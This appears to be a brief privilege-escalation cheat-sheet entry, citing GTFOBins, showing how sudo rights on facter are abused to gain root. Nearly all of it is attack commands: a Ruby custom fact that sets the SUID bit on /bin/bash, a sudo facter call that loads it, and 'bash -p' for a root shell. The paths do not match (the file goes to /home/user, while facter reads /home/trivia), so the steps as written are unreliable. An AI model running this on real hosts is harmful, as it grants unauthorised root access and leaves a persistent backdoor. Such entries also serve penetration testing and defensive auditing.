# FACTER

Reference: [GTFOBins - facter](https://gtfobins.org/gtfobins/facter/)

This example shows:

`sudo ALL:NOPASSWD` rights for `/usr/bin/facter`

1. Create a Ruby file and register a custom fact named `plz_work` that sets the SUID bit on `/bin/bash`.

```bash
echo 'Facter.add(:plz_work) do setcode { system("chmod +s /bin/bash") } end' > /home/user/root.rb
```

2. Execute the payload using the allowed `facter` sudo rights.

```bash
sudo /usr/bin/facter --custom-dir=/home/trivia/ plz_work
```

3. Get a root shell.

```bash
bash -p
```
